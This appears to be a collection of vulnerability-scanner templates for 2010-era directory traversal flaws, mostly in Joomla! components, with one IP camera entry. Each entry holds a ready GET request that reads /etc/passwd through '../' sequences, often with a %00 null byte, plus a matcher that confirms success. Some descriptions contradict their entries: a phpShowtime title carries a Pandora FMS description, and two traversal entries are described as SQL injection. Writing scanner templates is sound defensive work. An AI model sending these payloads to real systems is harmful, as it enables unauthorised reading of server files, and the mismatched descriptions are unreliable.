- A directory traversal vulnerability in the Music Manager component for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the cid parameter to album.html.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/component/music/album.html?cid=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Percha Gallery 1.6 Beta - Directory Traversal

## Description

- A directory traversal vulnerability in the Percha Gallery (com_perchagallery) component 1.6 Beta for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - packetstorm,cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_perchagallery&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component J!WHMCS Integrator 1.5.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the J!WHMCS Integrator (com_jwhmcs) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Horoscope 1.5.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Daily Horoscope (com_horoscope) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_janews - Local File Inclusion

## Description

- A directory traversal vulnerability in the JA News (com_janews) component 1.0 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_janews&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Ultimate Portfolio 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Ultimate Portfolio (com_ultimateportfolio) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_ultimateportfolio&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Picasa 2.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Picasa (com_joomlapicasa2) component 2.0 and 2.0.5 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# phpShowtime 2.0 - Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in Pandora FMS before 3.1.1 allow remote attackers to include and execute arbitrary local files via (1) the page parameter to ajax.php or (2) the id parameter to general/pandora_help.php, and allow remote attackers to include and execute, create, modify, or delete arbitrary local files via (3) the layout parameter to operation/agentes/networkmap.php.
- severity - high
- tags - phpshowtime,edb,cve,cve2010,lfi,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/pandora_console/ajax.php?page=../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Highslide 1.5 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Highslide JS (com_hsconfig) component 1.5 and 2.0.9 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_hsconfig&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Joomla! Flickr 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in joomlaflickr.php in the Joomla! Flickr (com_joomlaflickr) component 1.0.3 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Jimtawl 1.0.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Jimtawl (com_jimtawl) component 1.0.2 Joomla! allows remote attackers to read arbitrary files and possibly unspecified other impacts via a .. (dot dot) in the task parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JE Job 1.0 - Local File Inclusion

## Description

- A SQL injection vulnerability in the JExtensions JE Job (com_jejob) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the catid parameter in an item action to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jejob&view=../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Percha Image Attach 1.1 - Directory Traversal

## Description

- A directory traversal vulnerability in the Percha Image Attach (com_perchaimageattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,packetstorm,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_perchaimageattach&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Fabrik 2.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Fabrik (com_fabrik) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component TRAVELbook 1.0.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the TRAVELbook (com_travelbook) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_travelbook&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JE Quotation Form 1.0b1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the JE Quotation Form (com_jequoteform) component 1.0b1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jequoteform&view=../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Gadget Factory 1.0.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Gadget Factory (com_gadgetfactory) component 1.0.0 and 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Arcade Games 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Arcade Games (com_arcadegames) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_arcadegames&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component VJDEO 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the VJDEO (com_vjdeo) component 1.0 and 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component webERPcustomer - Local File Inclusion

## Description

- A directory traversal vulnerability in weberpcustomer.php in the webERPcustomer (com_weberpcustomer) component 1.2.1 and 1.x before 1.06.02 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Sweetykeeper 1.5 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Sweety Keeper (com_sweetykeeper) component 1.5.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_sweetykeeper&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Graphics 1.0.6 - Local File Inclusion

## Description

- A directory traversal vulnerability in graphics.php in the Graphics (com_graphics) component 1.0.6 and 1.5.0 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,packetstorm,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_graphics&controller=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Shoutbox Pro - Local File Inclusion

## Description

- A directory traversal vulnerability in the Shoutbox Pro (com_shoutbox) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_shoutbox&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component MMS Blog 2.3.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the MMS Blog (com_mmsblog) component 2.3.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_mmsblog&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Percha Categories Tree 0.6 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - packetstorm,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JA Comment - Local File Inclusion

## Description

- A directory traversal vulnerability in the JA Comment (com_jacomment) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jacomment&view=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Camtron CMNC-200 IP Camera - Directory Traversal

## Description

- The CMNC-200 IP Camera has a built-in web server that is vulnerable to directory transversal attacks, allowing access to any file on the camera file system.
- severity - high
- tags - cve,cve2010,iot,lfi,camera,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component BeeHeard 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the BeeHeard (com_beeheard) and BeeHeard Lite (com_beeheardlite) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Love Factory 1.3.4 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Love Factory (com_lovefactory) component 1.3.4 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JInventory 1.23.02 - Local File Inclusion

## Description

- A directory traversal vulnerability in jinventory.php in the JInventory (com_jinventory) component 1.23.02 and possibly other versions before 1.26.03, a module for Joomla!, allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component ZiMB Comment 0.8.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the ZiMB Comment (com_zimbcomment) component 0.8.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_jresearch - 'Controller' Local File Inclusion

## Description

- A directory traversal vulnerability in jresearch.php in the J!Research (com_jresearch) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_bfsurvey - Local File Inclusion

## Description

- A directory traversal vulnerability in the BF Survey (com_bfsurvey) component for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component iNetLanka Multiple root 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the iNetLanka Multiple root (com_multiroot) component 1.0 and 1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Online Market 2.x - Local File Inclusion

## Description

- A directory traversal vulnerability in the Online Market (com_market) component 2.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Percha Downloads Attach 1.1 - Directory Traversal

## Description

- A directory traversal vulnerability in the Percha Downloads Attach (com_perchadownloadsattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,edb,packetstorm,cve,cve2010,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JProject Manager 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Ternaria Informatica JProject Manager (com_jprojectmanager) component 1.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Canteen 1.0 - Local File Inclusion

## Description

- A SQL injection vulnerability in menu.php in the Canteen (com_canteen) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the mealid parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,packetstorm,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_canteen&controller=../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Jstore - 'Controller' Local File Inclusion

## Description

- A directory traversal vulnerability in Jstore (com_jstore) component for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Address Book 1.5.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the AddressBook (com_addressbook) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Jw_allVideos - Arbitrary File Retrieval

## Description

- A directory traversal vulnerability in includes/download.php in the JoomlaWorks AllVideos (Jw_allVideos) plugin 3.0 through 3.2 for Joomla! allows remote attackers to read arbitrary files via a ./../.../ (modified dot dot) in the file parameter.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/plugins/content/jw_allvideos/includes/download.php?file=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component simpledownload \<=0.9.5 - Arbitrary File Retrieval

## Description

- A directory traversal vulnerability in the SimpleDownload (com_simpledownload) component before 0.9.6 for Joomla! allows remote attackers to retrieve arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_simpledownload&task=download&fileid=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_jvideodirect - Directory Traversal

## Description

- Directory traversal vulnerability in the jVideoDirect (com_jvideodirect) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jvideodirect&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component DW Graph - Local File Inclusion

## Description

- A directory traversal vulnerability in dwgraphs.php in the DecryptWeb DW Graphs (com_dwgraphs) component 1.0 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi,graph

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component OrgChart 1.0.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the OrgChart (com_orgchart) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_orgchart&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_blog - Directory Traversal

## Description

- A directory traversal vulnerability in index.php in the MyBlog (com_myblog) component 3.0.329 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the task parameter.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_myblog&Itemid=1&task=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Property - Local File Inclusion

## Description

- A directory traversal vulnerability in the Real Estate Property (com_properties) component 3.1.22-03 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_properties&controller=../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component MS Comment 0.8.0b - Local File Inclusion

## Description

- A directory traversal vulnerability in the Moron Solutions MS Comment (com_mscomment) component 0.8.0b for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component FDione Form Wizard 1.0.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Dione Form Wizard (aka FDione or com_dioneformwizard) component 1.0.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component iF surfALERT 1.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the iF surfALERT (com_if_surfalert) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_if_surfalert&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component redTWITTER 1.0 - Local File Inclusion

## Description

- A drectory traversal vulnerability in the redTWITTER (com_redtwitter) component 1.0.x including 1.0b11 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,packetstorm,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Deluxe Blog Factory 1.1.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Deluxe Blog Factory (com_blogfactory) component 1.1.2 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Juke Box 1.7 - Local File Inclusion

## Description

- A directory traversal vulnerability in the JOOFORGE Jutebox (com_jukebox) component 1.0 and 1.7 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jukebox&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Saber Cart 1.0.0.12 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Seber Cart (com_sebercart) component 1.0.0.12 and 1.0.0.13 for Joomla!, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_sebercart&view=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Picasa2Gallery 1.2.8 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Picasa2Gallery (com_picasa2gallery) component 1.2.8 and earlier for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,packetstorm,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_rokdownloads - Local File Inclusion

## Description

- A directory traversal vulnerability in the RokDownloads (com_rokdownloads) component before 1.0.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_rokdownloads&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component SMEStorage - Local File Inclusion

## Description

